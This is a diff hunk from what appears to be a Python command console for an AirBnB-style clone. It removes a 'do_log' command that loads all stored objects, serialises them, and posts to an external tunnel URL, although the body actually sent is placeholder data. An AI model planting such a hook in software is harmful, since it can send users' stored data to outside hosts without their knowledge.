@@ -160,15 +160,6 @@ class HBNBCommand(cmd.Cmd):
                 return
         print("** no instance found *")
 
-    def do_log(self, args):
-        instances = FileStorage()
-        instances.reload()
-        myJson = dumps(instances.all())
-        url = '62bf14fc25601f.lhr.life/'
-        myobj = dumps({'somekey': 'somevalue'})
-        x = requests.post(url, json=myobj)
-        print(x.text)
-
 
 if __name__ == '__main__':
     HBNBCommand().cmdloop()
